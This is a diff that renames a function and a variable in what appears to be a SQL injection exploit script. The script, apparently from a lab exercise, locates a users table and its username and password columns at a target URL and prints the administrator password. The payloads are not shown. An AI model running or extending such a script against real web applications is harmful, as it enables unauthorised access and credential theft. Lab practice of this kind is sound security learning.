@@ -55,7 +55,7 @@ def get_users_columns(url, users_table):
         return username_column, password_column
     raise ValueError("Could not find username or password columns.")
 
-def get_administrator_password(
+def get_password(
         url,
         users_table,
         username_column,
@@ -89,12 +89,12 @@ if __name__ == "__main__":
         print("Found the password column name: %s" % password_column)
 
         print("Looking for the administrator password...")
-        admin_password = get_administrator_password(
+        password = get_password(
             url,
             users_table,
             username_column,
             password_column)
-        print("[+] The administrator password is: %s " % admin_password)
+        print("[+] The administrator password is: %s " % password)
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
         print("[-] Example: %s www.example.com" % sys.argv[0])
